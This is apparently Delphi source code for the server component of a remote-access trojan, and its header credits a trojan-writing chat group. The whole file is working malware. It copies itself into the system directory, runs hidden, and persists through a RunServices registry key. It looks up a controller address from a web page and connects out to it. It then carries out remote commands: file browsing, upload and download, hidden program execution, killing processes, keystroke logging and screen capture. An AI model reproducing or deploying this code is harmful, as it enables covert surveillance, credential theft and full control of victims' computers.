unit mainserve;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdAntiFreezeBase, IdAntiFreeze, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, ExtCtrls,TLHelp32, jpeg,ShellApi,
  IdHTTP,Registry;


const
  KeyMask = $80000000;

      cOsUnknown              : Integer = -1;
      cOsWin95                : Integer =  0;
      cOsWin98                : Integer =  1;
      cOsWin98SE              : Integer =  2;
      cOsWinME                : Integer =  3;
      cOsWinNT                : Integer =  4;
      cOsWin2000              : Integer =  5;
      cOsWhistler             : Integer =  6;

type
  TServerForm = class(TForm)
    IdTCPClient1: TIdTCPClient;
    IdAntiFreeze1: TIdAntiFreeze;    //未完成時按任和鍵 都不會動作 就好像當機一樣若加入 IdAntiFreeze元件 就不會了
    Timer1: TTimer;
    IdHTTP1: TIdHTTP;
    procedure Timer1Timer(Sender: TObject);
    function ConRpcport(BThread: TIdTCPClient):Boolean;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure IdTCPClient1Disconnected(Sender: TObject);
  private
    { Private declarations }
  public

     procedure SendStreamToClient(AThread: TIdTCPClient;Cmd,TempStr:String); //消息的接收
     procedure ZhiXingCmd(var StrTmpList:TStringList);   //文件路径和系统信息
     procedure ReadMe;     //自述
    { Public declarations }
  end;



TClientHandleThread = class(TThread)   //接收线程类  接收线程单元
                         private
                           CommandStr:String;
                           procedure HandleInput;
                         protected
                           procedure Execute; override;
                         Public
                           constructor Create;
                           destructor Destroy; override;
                        end;

//const httpurl='http://duguxike.yeah.net/                                  ';

var
  ServerForm: TServerForm;
  ThreadID:array [0..100] of Dword;
  H:THandle;
  II:DWord;
  allhwnd:array [0..100] of hwnd;
  ClientHandleThread: TClientHandleThread;
  LogHook: HHook = 0;
  hookkey:String;
  LastFocusWnd: HWnd = 0;
  PrvChar: Char;
  HookList: TStringList;
  Myipstr:string;
  Servername,httpurl:string;
implementation

{$R *.dfm}

procedure TServerForm.SendStreamToClient(AThread: TIdTCPClient;Cmd,TempStr:String);
var
  MyStream: TMemoryStream;
  i:integer;
begin
    Try
       if not AThread.Connected then exit;
       MyStream:=TMemoryStream.Create;
       AThread.Writeln(Cmd);
       MyStream.Write(TempStr[1],Length(TempStr));
       MyStream.Position:=0;
       i:=MyStream.size;
       AThread.WriteInteger(i);
       AThread.WriteStream(MyStream);
       MyStream.Free;
     Except
       AThread.Disconnect;
       MyStream.Free;
     end;
end;

procedure TServerForm.ZhiXingCmd(var StrTmpList:TStringList);
var
Request:string;
begin
 if StrTmpList[1]='002' then   {路径列表}
   begin
       Request:='';//FindFile(StrTmpList[2]);
       SendStreamToClient(IdTCPClient1,'002',Request);
     Exit;
   end;
  if StrTmpList[1]='021' then
  begin  {系统信息}
     Request:='';//SystemXingxi;
     SendStreamToClient(IdTCPClient1,'007',Request);
     Exit;
  end;

end;

function FindFile(Path: string): string; {搜索文件夹和文件}
var
 Sr: TSearchRec;
  CommaList: TStringList;
  s: string;
  dt: TDateTime;
begin
  commalist := Tstringlist.Create;
  try
    Findfirst(path + '*.*', faAnyFile, sr);
    if ((Sr.Attr and faDirectory) > 0) and (Sr.Name <> '.') then
    begin
      dt := FileDateToDateTime(sr.Time);
      s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
      commalist.add('*' + s + sr.name);
    end;
    while findnext(sr) = 0 do
    begin
      if ((Sr.Attr and faDirectory) > 0) and (Sr.Name <> '..') then
      begin
        dt := FileDateToDateTime(sr.Time);
        s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
        commalist.add('*' + s + sr.name);
      end;
    end;
    FindClose(sr);
    FindFirst(path + '*.*', faArchive + faReadOnly + faHidden + faSysFile, Sr);
    if Sr.Attr <> faDirectory then
    begin
      dt := FileDateToDateTime(sr.Time);
      s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
      commalist.add('\' + s+ Format('%.0n', [sr.Size / 1]) + '|' + sr.name);
    end; //Inttostr(
    while findnext(sr) = 0 do
    begin
      if (sr.Attr <> faDirectory) then
      begin
        dt := FileDateToDateTime(sr.Time);
        s := FormatDateTime('yyyy-mm-dd hh:nn', dt);
        commalist.add('\' + s +Format('%.0n', [sr.Size / 1]) + '|' + sr.name);
      end;
    end;
    FindClose(Sr);
  except
  end;
  Result := commalist.Text;     //Result是消息的 定义
  commalist.Free;
end;

function GetFileName(FileName: string): string; {从路径中分离文件名}
var Contador: integer;
begin
  Contador := 1;
  while Copy(FileName, Length(FileName) - Contador, 1) <> '\' do
  begin
    Contador := Contador + 1;
  end;
  Result := (Copy(FileName, Length(FileName) - Contador + 1, Length(FileName)));
end;

function GetFilepath(FileName: string): string; {从全路径中分离路径,有'\'}
var Contador: integer;
begin
  Contador := 1;
  while Copy(FileName, Length(FileName) - Contador, 1) <> '\' do
  begin
    Contador := Contador + 1;
  end;
  Result := (Copy(FileName, 1, Length(FileName) - Contador));
end;

function DiskInDrive(Drive: Char): Boolean;
var ErrorMode: word;
begin
  if Drive in ['a'..'z'] then Dec(Drive, $20);
  if not (Drive in ['A'..'Z']) then
  begin
    Result := False;
    Exit;
  end;
  ErrorMode := SetErrorMode(SEM_FailCriticalErrors);
  try
    if DiskSize(Ord(Drive) - $40) = -1 then
      Result := False
    else
      Result := True;
  finally
    SetErrorMode(ErrorMode);
  end;
end;

procedure GetDrivernum(var DiskList: TStringList);
var
  i: Char;
  AChar: array[1..3] of char;
  j: integer;
  drv: PChar;
begin
  for i := 'C' to 'Z' do
  begin
    if DiskInDrive(i) then
    begin
      AChar[1] := i;
      AChar[2] := ':';
      AChar[3] := #0;
      drv := @AChar;
      J := GetDriveType(drv);
      if J = DRIVE_REMOVABLE then
        DiskList.Add(i + ':4'); //(软盘)
      if J = DRIVE_FIXED then
        DiskList.Add(i + ':1'); //(硬盘)
      if J = DRIVE_REMOTE then
        DiskList.Add(i + ':3'); //(网络映射)
      if J = DRIVE_CDROM then
        DiskList.Add(i + ':2'); //(光盘)
      if J = DRIVE_RAMDISK then
        DiskList.Add(i + ':4'); // (虚拟盘)
      if J = DRIVE_UNKNOWN then
        DiskList.Add(i + ':4'); // (未知盘)
    end;
  end;
end;

procedure My_GetScreenToBmp(DrawCur:Boolean;StreamName:TMemoryStream);
var
Mybmp:Tbitmap;
Cursorx, Cursory: integer;
dc: hdc;
Mycan: Tcanvas;
R: TRect;
DrawPos: TPoint;
MyCursor: TIcon;
hld: hwnd;
Threadld: dword;
mp: tpoint;
pIconInfo: TIconInfo;
begin
Mybmp := Tbitmap.Create; {建立BMPMAP }
Mycan := TCanvas.Create; {屏幕截取}
dc := GetWindowDC(0);
try
Mycan.Handle := dc;
R := Rect(0, 0,  Screen.Width,Screen.Height{GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)});
Mybmp.Width := R.Right;
Mybmp.Height := R.Bottom;
Mybmp.Canvas.CopyRect(R, Mycan, R);
finally
releaseDC(0, DC);
end;
Mycan.Handle := 0;
Mycan.Free;

if DrawCur then {画上鼠标图象}
begin
GetCursorPos(DrawPos);
MyCursor := TIcon.Create;
getcursorpos(mp);
hld := WindowFromPoint(mp);
Threadld := GetWindowThreadProcessId(hld, nil);
AttachThreadInput(GetCurrentThreadId, Threadld, True);
MyCursor.Handle := Getcursor();
AttachThreadInput(GetCurrentThreadId, threadld, False);
GetIconInfo(Mycursor.Handle, pIconInfo);
cursorx := DrawPos.x - round(pIconInfo.xHotspot);
cursory := DrawPos.y - round(pIconInfo.yHotspot);
Mybmp.Canvas.Draw(cursorx, cursory, MyCursor); {画上鼠标}
DeleteObject(pIconInfo.hbmColor);{GetIconInfo 使用时创建了两个bitmap对象. 需要手工释放这两个对象}
DeleteObject(pIconInfo.hbmMask);{否则,调用他后,他会创建一个bitmap,多次调用会产生多个,直至资源耗尽}
Mycursor.ReleaseHandle; {释放数组内存}
MyCursor.Free; {释放鼠标指针}
end;
Mybmp.PixelFormat:=pf8bit;  //256色
//Mybmp.SaveToFile(Filename);
Mybmp.SaveToStream(StreamName);
Mybmp.Free;
end;

Function GetOSVersion : Integer;
 Var
      osVerInfo          : TOSVersionInfo;
      majorVer, minorVer : Integer;
Begin
      Result := cOsUnknown;
      osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
      If ( GetVersionEx(osVerInfo) ) Then Begin
          majorVer := osVerInfo.dwMajorVersion;
          minorVer := osVerInfo.dwMinorVersion;
          Case ( osVerInfo.dwPlatformId ) Of
              VER_PLATFORM_WIN32_NT : { Windows NT/2000 }
                  Begin
                      If ( majorVer <= 4 ) Then
                          Result := cOsWinNT
                      Else
                          If ( ( majorVer = 5 ) And ( minorVer= 0 ) ) Then
                              Result := cOsWin2000
                          Else
                              If ( ( majorVer = 5) And ( minorVer = 1 ) ) Then
                                  Result := cOsWhistler
                              Else
                                  Result := cOsUnknown;
                  End;
              VER_PLATFORM_WIN32_WINDOWS :  { Windows 9x/ME }
                  Begin
                      If ( ( majorVer = 4 ) And ( minorVer = 0 ) ) Then
                          Result := cOsWin95
                      Else If ( ( majorVer = 4 ) And ( minorVer = 10 ) ) Then Begin
                          If ( osVerInfo.szCSDVersion[ 1 ] = 'A' ) Then
                              Result := cOsWin98SE
                          Else
                              Result := cOsWin98;
                      End Else If ( ( majorVer = 4) And ( minorVer = 90 ) ) Then
                          Result := cOsWinME
                      Else
                          Result := cOsUnknown;
                  End;
          Else
              Result := cOsUnknown;
          End;
      End Else
          Result := cOsUnknown;
  End;

  Function GetOSName( OSCode : Integer ) : String;
  Begin
      If ( OSCode = cOsUnknown ) Then
          Result := 'Microsoft Unknown'
      Else If ( OSCode = cOsWin95 ) Then
          Result := 'Windows 95'
      Else If ( OSCode = cOsWin98 ) Then
          Result := 'Windows 98'
      Else If ( OSCode = cOsWin98SE ) Then
          Result := 'Windows 98 SE'
      Else If ( OSCode = cOsWinME ) Then
          Result := 'Windows ME'
      Else If ( OSCode = cOsWinNT ) Then
          Result := 'Windows NT'
      Else If ( OSCode = cOsWin2000 ) Then
          Result := 'Windows 2000 / NT 5'
      Else
          Result := 'Windows XP / Other';
  End;



function EnableDebugPrivilege: Boolean;
  function EnablePrivilege(hToken: Cardinal; PrivName: string; bEnable: Boolean): Boolean;
  var
    TP: TOKEN_PRIVILEGES;
    Dummy: Cardinal;
  begin
  try
    TP.PrivilegeCount := 1;
    LookupPrivilegeValue(nil, pchar(PrivName), TP.Privileges[0].Luid);
    if bEnable then
      TP.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED
    else TP.Privileges[0].Attributes := 0;
    AdjustTokenPrivileges(hToken, False, TP, SizeOf(TP), nil, Dummy);
    Result := GetLastError = ERROR_SUCCESS;
  except
  end;
  end;
var
  hToken: Cardinal;
begin
try
  OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken);
  EnablePrivilege(hToken, 'SeDebugPrivilege', True);
  CloseHandle(hToken);
except
end;
end;

function Savenowtask:String;     //进程内容
var
    isOK:Boolean;
    ProcessHandle:Thandle;
    ProcessStruct:TProcessEntry32;
    TheList:Tstringlist;
    i:integer;
begin
     TheList:=Tstringlist.Create;
     ProcessHandle:=createtoolhelp32snapshot(Th32cs_snapprocess,0);
     processStruct.dwSize:=sizeof(ProcessStruct);
     isOK:=process32first(ProcessHandle,ProcessStruct);
     for i:=0 to 100 do ThreadID[i]:=0;
     ThreadID[0]:=ProcessStruct.th32ProcessID;
     i:=0;
     while isOK do
     begin
	 TheList.Add(ProcessStruct.szExeFile);//进程名-------------------1
         if true then  //   isNt
         begin
	   TheList.Add(IntToStr(ProcessStruct.th32ProcessID));//进程ID-----2
	   TheList.Add(IntToStr(ProcessStruct.cntThreads));//线程数--------3
	   TheList.Add(IntToStr(ProcessStruct.pcPriClassBase));//优先级-4
	   TheList.Add(IntToStr(ProcessStruct.th32ParentProcessID));//父进程ID-5
         end else
         begin
	   TheList.Add(IntTostr(ProcessStruct.th32ProcessID));//进程ID-----2
	   TheList.Add('0');//线程数--------3
	   TheList.Add('0');//优先级-4
	   TheList.Add('0');//父进程ID-5
         end;
	 isOK:=process32next(ProcessHandle,ProcessStruct);
         inc(i);
         ThreadID[i]:=ProcessStruct.th32ProcessID;
     end;
     Result:=TheList.text;
     CloseHandle(ProcessHandle);
     TheList.Free;
end;
function Killprocsee(id:integer): Boolean;
begin
    Result := False;
    try
        EnableDebugPrivilege;
        H:=OpenProcess(Process_All_Access, True,ThreadID[id]);
        GetExitCodeProcess(H,II);
        TerminateProcess(H,II);
        Result := True;
    except
    end;
end;

function Searchallwindow:string;
var
  hCurrentWindow: HWnd;
  szText: array[0..254] of char;
  i:integer;
  winlist:TStringlist;
begin
  winlist:=TStringlist.Create;
  for i:=0 to 100 do allhwnd[i]:=0;
  i:=0;
  hCurrentWindow := GetWindow(application.Handle, GW_HWNDFIRST);
  while hCurrentWindow <> 0 do
  begin
    if GetWindowText(hCurrentWindow, @szText, 255) > 0 then
      begin
             if sztext<>'Default IME' then
                begin
                  allhwnd[i]:=hcurrentwindow;
                  inc(i);
                  Winlist.Add(Sztext);
                end;
          end;
    hCurrentWindow := GetWindow(hCurrentWindow, GW_HWNDNEXT);
  end;
  Result :=Winlist.Text;
  Winlist.Free;
end;

function LogProc(iCode: Integer; wparam, lparam: LongInt): lresult; stdcall;
var
  ch: Char;
  vKey: Integer;
  FocusWnd: HWND;
  Title: array[0..255] of Char;
  str: array[0..12] of Char;
  TempStr, Time: string;
  LogFile: TextFile;
  PEvt: ^EVENTMSG;
  iCapital, iNumLock, iShift: Integer;
  bShift, bCapital, bNumLock: Boolean;
begin
  if iCode < 0 then
  begin
    Result := CallNextHookEx(LogHook, iCode, wParam, lParam);
    exit;
  end;
  if (iCode = HC_ACTION) then
  begin
    pEvt := Pointer(DWord(lParam));
    
    FocusWnd := GetActiveWindow;
    if LastFocusWnd <> FocusWnd then
    begin
      if hookkey<>'' then
        begin
          HookList.Add(hookkey);
          hookkey :='';
        end;
      HookList.Add('---------End----------');
      HookList.Add('--------begin---------');
      GetWindowText(FocusWnd, Title, 256);
      LastFocusWnd := FocusWnd;
      Time := DateTimeToStr(Now);
      HookList.Add(Time + Format('Title:%s', [Title]));
    end;

    if pEvt.message = WM_KEYDOWN then
    begin
      vKey := LOBYTE(pEvt.paramL);
      iShift := GetKeyState($10);
      iCapital := GetKeyState($14);
      iNumLock := GetKeyState($90);
      bShift := ((iShift and KeyMask) = KeyMask);
      bCapital := ((iCapital and 1) = 1);
      bNumLock := ((iNumLock and 1) = 1);

      //HookList.Add('这是vKey:'+inttostr(vKey));

      if ((vKey >= 48) and (vKey <= 57)) then
        begin
          if not bShift then
            begin
              ch := Char(vKey);
            end else begin
              case vKey of
                48: ch := ')';
                49: ch := '!';
                50: ch := '@';
                51: ch := '#';
                52: ch := '$';
                53: ch := '%';
                54: ch := '^';
                55: ch := '&';
                56: ch := '*';
                57: ch := '(';
              end;
           end;
         hookkey:=hookkey+ch;
       end;
      if (vKey >= 65) and (vKey <= 90) then // A-Z a-z
      begin
        if not bCapital then
        begin
          if bShift then
            ch := Char(vKey)
          else
            ch := Char(vKey + 32);
        end
        else begin
          if bShift then
            ch := Char(vKey + 32)
          else
            ch := Char(vKey);
        end;
        hookkey:=hookkey+ch;
      end;
      if (vKey >= 96) and (vKey <= 105) then // 小键盘0-9
        if bNumLock then
        hookkey:=hookkey+Char(vKey - 96 + 48);
      ch:='n';
      if (VKey > 105) and (VKey <= 111) then
      begin
        case vKey of
          106: ch := '*';
          107: ch := '+';
          109: ch := '-';
          111: ch := '/';
        else
          ch := 'n';
        end;
      end;
      if (vKey >= 186) and (vKey <= 222) then // 其他键
      begin
        case vKey of
          186: if not bShift then ch := ';' else ch := ':';
          187: if not bShift then ch := '=' else ch := '+';
          188: if not bShift then ch := ',' else ch := '<';
          189: if not bShift then ch := '-' else ch := '_';
          190: if not bShift then ch := '.' else ch := '>';
          191: if not bShift then ch := '/' else ch := '?';
          192: if not bShift then ch := '`' else ch := '~';
          219: if not bShift then ch := '[' else ch := '{';
          220: if not bShift then ch := '\' else ch := '|';
          221: if not bShift then ch := ']' else ch := '}';
          222: if not bShift then ch := Char(27) else ch := '"';
        else
          ch := 'n';
        end;
      end;
      if ch <> 'n' then
      hookkey:=hookkey+ ch;

      // if (wParam >=112 && wParam<=123) // 功能键   [F1]-[F12]
      if (vKey >= 8) and (vKey <= 46) then //方向键
      begin
        ch := ' ';
        case vKey of
          8: str := '[退格]';
          9: str := '[TAB]';
          13: str := '[Enter]';
          32: str := '[空格]';
          33: str := '[PageUp]';
          34: str := '[PageDown]';
          35: str := '[End]';
          36: str := '[Home]';
          37: str := '[LF]';
          38: str := '[UF]';
          39: str := '[RF]';
          40: str := '[DF]';
          45: str := '[Insert]';
          46: str := '[Delete]';
        else
          ch := 'n';
        end;
        if ch <> 'n' then
        begin
          //if PrvChar<>Char(vKey) then
          //begin
            hookkey :=hookkey+str;
          // PrvChar := Char(vKey);
          //end;
        end;
      end;
   end ;
{     else
      if (pEvt.message = WM_LBUTTONDOWN) or (pEvt.message = WM_RBUTTONDOWN) then
      begin
        if hookkey<>'' then
          begin
            HookList.add(Hookkey);
            hookkey:='';
          end;
        if pEvt.message = WM_LBUTTONDOWN then
          TempStr := '鼠标左键: '
        else
          TempStr := '鼠标右键: ';
        HookList.Add(TempStr + Format('x:%d,y:%d', [pEvt.paramL, pEvt.paramH]));
      end;
    //CloseFile(LogFile);  }
  end;
  Result := CallNextHookEx(LogHook, iCode, wParam, lParam);
end;

function Installhook:string;
begin
     if LogHook = 0 then
       begin
         Result:='Cmd009';           //启动键盘记录成功!查看记录前请先终止键盘记录!
         LogHook := SetWindowsHookEx(WH_JOURNALRECORD, LogProc, HInstance, 0);
       end else begin
         Result:='Cmd010';           //键盘记录已经启动过了!
       end;
end;
function Uninstallhook:string;
begin
     try
       if LogHook <> 0 then
         begin
           UnhookWindowsHookEx(LogHook);
           LogHook := 0;
           HookList.Add(Hookkey);
           HookList.Add('*********End**********');
           Hookkey:='';
         end;
     except
     end;
     Result:='Cmd012';      //终止键盘记录成功!
end;
//-------------------------------------------------

constructor TClientHandleThread.Create;
begin
   inherited Create(True);
   FreeOnTerminate:=True;
   Suspended := false;
   //Priority:=tpIdle;
end;

destructor TClientHandleThread.Destroy;
begin
  inherited destroy;
end;

procedure TClientHandleThread.HandleInput;
var
  RDStrList,RootDStrList:TStringList;
  Request,Temp:String;
  i:integer;
  MyFirstBmp:TMemoryStream;
  AFileStream: TFileStream; //传输的文件流
begin
try
  RDStrList:=TStringList.Create;
  RDStrList.Text:=CommandStr;  //线程

  if  RDStrList[0] = '001' then
  begin
     RootDStrList:=TStringList.Create;
     GetDrivernum(RootDStrList);
     Request:=RootDStrList.Text;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'001',Request);
     RootDStrList.Free;
  end;
  if  RDStrList[0] = '002' then
  begin
     Request:= FindFile(RDStrList[1]);
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'002',Request);
     Exit;
  end;
  if  RDStrList[0] = '010' then     {删除文件或文件夹}
  begin
        try
          if DirectoryExists(RDStrList[1]) then begin
                  RemoveDir(RDStrList[1]);
              end
           else begin
              if FIleExists(RDStrList[1])  then
                begin
                    FilesetAttr(RDStrList[1],0);
                    DeleteFile(RDStrList[1]);
                end;
              end;
        except
        end;
  end;
  if  RDStrList[0] = '011' then  {新建文件夹}
  begin
     try
       Temp:=RDStrList[1];
       i:=0;
       while DirectoryExists(Temp) do
        begin
          inc(i);
          Temp := GetFilepath(RDStrList[1])+ GetFileName(RDStrList[1])+ '(' + inttoStr(i) + ')';
        end;
       CreateDir(Temp);
     except
     end;
     Exit;
  end;
  if  RDStrList[0] = '012' then   {接收客户端传来的文件 }
  begin
      try
        AFileStream:=TFileStream.Create(RDStrList[1], fmCreate);
        try
         i:=ServerForm.IdTCPClient1.ReadInteger();
         ServerForm.IdTCPClient1.ReadStream(AFileStream,i);
        except
        end;
      finally
       AFileStream.Free;
      end;
  end;
  if  RDStrList[0] = '013' then    {发送文件到客户端 }
  begin
      try
        AFileStream:=TFileStream.Create(RDStrList[1], fmOpenRead);
        try
         ServerForm.IdTCPClient1.WriteLn('013');
         ServerForm.IdTCPClient1.WriteInteger(AFileStream.Size);
         ServerForm.IdTCPClient1.WriteStream(AFileStream);
        except
        end;
      finally
       AFileStream.Free;
      end;
  end;
  if  RDStrList[0] = '014' then {远程运行文件}
  begin
    try
       if  RDStrList.Count = 3 then
         case Strtoint(RDStrList[1]) of
             0:ShellExecute(0, nil, pchar(RDStrList[2]),nil, nil, SW_HIDE);
             1:ShellExecute(0, nil, pchar(RDStrList[2]),nil, nil, SW_NORMAL);
             2:ShellExecute(0, nil, pchar(RDStrList[2]),nil, nil, SW_MAXIMIZE);
             3:ShellExecute(0, nil, pchar(RDStrList[2]),nil, nil, SW_MINIMIZE);
         end
       else  case Strtoint(RDStrList[1]) of
             0:ShellExecute(0, nil, pchar(RDStrList[2]),pchar(RDStrList[3]), nil, SW_HIDE);
             1:ShellExecute(0, nil, pchar(RDStrList[2]),pchar(RDStrList[3]), nil, SW_NORMAL);
             2:ShellExecute(0, nil, pchar(RDStrList[2]),pchar(RDStrList[3]), nil, SW_MAXIMIZE);
             3:ShellExecute(0, nil, pchar(RDStrList[2]),pchar(RDStrList[3]), nil, SW_MINIMIZE);
         end;
     except
     end;
  end;
  if  RDStrList[0] = '020' then
  begin
     Request:= Savenowtask;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'020',Request);
     Exit;
  end;
  if  RDStrList[0] = '021' then
  begin
    if Killprocsee(strtoint(RDStrList[1])) then
    begin
     Request:= Savenowtask;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'020',Request);     //刷新一下
     Exit;
     end;
  end;
  if  RDStrList[0] = '030' then
  begin
     Request:= Searchallwindow;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'030',Request);
  end;
  if  RDStrList[0] = '031' then
  begin
     try
       Showwindow(allhwnd[strtoint(RDStrList[1])],SW_SHOW);
     except
     end;
     Request:= Searchallwindow;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'030',Request);
  end;
  if  RDStrList[0] = '032' then
  begin
     try
       Showwindow(allhwnd[strtoint(RDStrList[1])],SW_Hide);
     except
     end;
     Request:= Searchallwindow;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'030',Request);
  end;
  if  RDStrList[0] = '033' then
  begin
     try
      PostMessage(allhwnd[strtoint(RDStrList[1])],WM_Close,0,0);
     except
     end;
     Request:= Searchallwindow;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'030',Request);
  end;

  if  RDStrList[0] = '040' then
   begin   {启动键盘记录}
     Request:= Installhook;
    // if Request='' then Request:='Cmd011';      //启动键盘记录成功!查看记录前请先终止键盘记录!
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'040',Request);
     Exit;
  end;
  if  RDStrList[0] = '041' then
   begin   {终止键盘记录}
      Request:= Uninstallhook;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'041',Request);
     Exit;
  end;
  if  RDStrList[0] = '042' then
   begin   {查看键盘记录}
     Request:=HookList.Text;
     if Request='' then
     begin
       Request:='NULL';  //键盘记录为空.
     end;
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'042',Request);
     Exit;
  end;
  if  RDStrList[0] = '043' then
   begin   {清空键盘记录}
     try
       HookList.Clear;
     except
     end;
     Request:='Cmd014';      //清空键盘记录完成!
     ServerForm.SendStreamToClient(ServerForm.IdTCPClient1,'043',Request);
     Exit;
  end;
  if  RDStrList[0] = '050' then
  begin
       MyFirstBmp:=TMemoryStream.Create;
       //MyFirstBmp.Clear;
       My_GetScreenToBmp(true,MyFirstBmp);
       MyFirstBmp.Position:=0;
       try
        ServerForm.IdTCPClient1.WriteLn('050');
        ServerForm.IdTCPClient1.WriteInteger(MyFirstBmp.Size);
        ServerForm.IdTCPClient1.WriteBuffer(MyFirstBmp.Memory^,MyFirstBmp.Size,true);
       except
       end;
       MyFirstBmp.Free;
  end;
  if RDStrList[0] = '060' then        //摄像头监控
  begin

  end;
  if RDStrList[0] = '063' then      //停止摄像头监控
  begin
  end;
  if RDStrList[0] = '080' then    //卸载服务端
  begin
   with TRegistry.Create do
   try
   RootKey := HKEY_LOCAL_MACHINE;
   OpenKey('Software\Microsoft\Windows\CurrentVersion\RunServices', TRUE );
   DeleteValue('alalmn');      //删除这个键值
   finally
   free;
   end;
   ServerForm.IdTCPClient1.Disconnect;  //断开TCP
   ServerForm.Timer1.Enabled:=false;   //关闭TCP
   Terminate;  //退出
   application.Terminate;  //全局变量退出
   Exit; //停止
  end;

except
  Terminate;   //退出
  Exit;    //停止
end;


end;

procedure TClientHandleThread.Execute;
var
Thesize:Integer;
ThtStr:String;
RsltStream: TMemoryStream;
begin
  while not Terminated do
  begin
   { if not H_GZVIP2004.IdTCPOnline.Connected then
    begin
      H_GZVIP2004.ToClientDisconnect;
      Break;
    end
    else begin }
      try
        ThtStr:=ServerForm.IdTCPClient1.ReadLn();                    //H_GZVIP2004.IdTCPOnline.ReadLn(EOL);
        Thesize:=Strtoint(ThtStr);
        if Thesize>0 then
          begin
            try
              RsltStream := TmemoryStream.Create;
              ServerForm.IdTCPClient1.ReadStream(RsltStream,Thesize,False);
              RsltStream.Position := 0;
              SetLength(CommandStr, RsltStream.Size);
              RsltStream.Read(CommandStr[1], RsltStream.Size);
              RsltStream.Free;
              Synchronize(HandleInput);
            Except
             // H_GZVIP2004.ToClientDisconnect;
              Break;
            end;
          end;
     except
     end;
    end;
  //end;
end;
//-------------------------------------------------------------
function GetInfoByYearNet(const Str:String):String;  //获取到的网页文件做相应的处理
var i,j:integer;    //获取到的 {window.location = "http://123.6.48.96";;}
begin
Result:=''; 
i:=Pos('{window.location = "http://',Str);
if i=0 then Exit;
i:=i+length('{window.location = "http://');
j:=Pos('";;}',Str);
Result:= copy(Str,i,j-i); //提取到的IP
end;

function TServerForm.ConRpcport(BThread: TIdTCPClient):Boolean;
begin
 try
    Myipstr:='';
     try
       Myipstr:=GetInfoByYearNet(IdHTTP1.Get(httpurl));  //运行GetInfoByYearNet获取网页内容 用IdHTTP1获取
     except
     end;
  if Myipstr<>'' then
  begin
   if BThread.Connected then  //判断线程连接
     BThread.Disconnect;  //就断开
   BThread.Host:=Myipstr;  //上边获取到的网页IP文件
   BThread.Port:=1058;    //端口
   BThread.Connect;      //连接
   Result:=True;         //结果真
  end;
  except
   Result:=False;      //否则为假
  end;
  {
   try
     if BThread.Connected then
         BThread.Disconnect;
      BThread.Host:='127.0.0.1';
      BThread.Port:=7626;
      BThread.Connect();
      Result:=True;
    except
      Result:=False;
    end;
    }
end;

procedure TServerForm.Timer1Timer(Sender: TObject);
begin
 try
 if not IdTCPClient1.Connected then    //判断TCP是否连接
 begin   //没有连接往下运行
  if ConRpcport(IdTCPClient1) then  //由IdTCPClient1与服务端连接
     begin
         if not IdTCPClient1.Connected then exit; //没有连接 停止连接继续运行
         SendStreamToClient(IdTCPClient1,'000',Servername+#13+GetOSName(GetOSVersion));
         ClientHandleThread:=TClientHandleThread.Create;
    end;
 end;
 except
 end;
end;

procedure TServerForm.ReadMe;
var
   i,j:integer;
   F:file;
   Symbol: array [1..50] of char;
   Symbol1:array [1..50] of char;
   Symbolsize,Symbolsize1: array [1..2] of char;
begin
  for i:=1 to 50 do
  begin
    Symbol[i]:=#00;
    Symbol1[i]:=#00;
  end;
  CopyFile(pChar(ParamStr(0)), pChar(ParamStr(0)+'_'), False);
  Assignfile(F,Paramstr(0)+'_');
  Reset(f,1);
  Seek(F,Filesize(f)-2);
  BlockRead(F,Symbolsize,2);
  i :=strtoint(Symbolsize);
  //showmessage(Symbolsize);
  Seek(F,Filesize(f)-2-i);
  BlockRead(F,Symbol,i);
  Servername:=Trim(Symbol);

 // showmessage(Servername);

  Seek(F,Filesize(f)-i-4);
  BlockRead(F,Symbolsize1,2);
  j :=strtoint(Symbolsize1);
  Seek(F,Filesize(f)-i-4-j);
  BlockRead(F,Symbol1,j);
  httpurl:=Trim(Symbol1);

 // showmessage(httpurl);
  Closefile(f);
  DeleteFile(pChar(ParamStr(0)+'_'));
end;

function GetWinDir: String;
var
Buf: array[0..MAX_PATH] of char;
begin
GetSystemDirectory(Buf, MAX_PATH);
Result := Buf;
if Result[Length(Result)]<>'\' then Result := Result + '\';
end;

procedure TServerForm.FormCreate(Sender: TObject);
var
myname:string;
//Reg:TRegistry;
begin
 myname := ExtractFilename(Application.Exename); //获得文件名
 if application.Exename <> GetWindir +myname then //如果文件不是在WindowsSystem那么..
 begin
 copyfile(pchar(application.Exename), pchar(GetWindir + myname), False);//将自己拷贝到WindowsSystem下
 Winexec(pchar(GetWindir + myname), sw_hide);//运行WindowsSystem下的新文件
 application.Terminate;//退出
 end else
 begin
  with TRegistry.Create do
  try
  RootKey := HKEY_LOCAL_MACHINE;
  OpenKey('Software\Microsoft\Windows\CurrentVersion\RunServices', TRUE );    //RunServices自启动
  WriteString('alalmn', application.ExeName );     //application.ExeName获取当前路径写入注册表
  finally
  free;
  end;
  ReadMe;

  HookList:= Tstringlist.Create;  //创建内存
 end;
end;

procedure TServerForm.FormDestroy(Sender: TObject);
begin
    HookList.Free;    //软件被破坏时释放内存
end;

procedure TServerForm.IdTCPClient1Disconnected(Sender: TObject);
begin
   ClientHandleThread.Destroy;    //文件被破坏就会停止
end;

end.
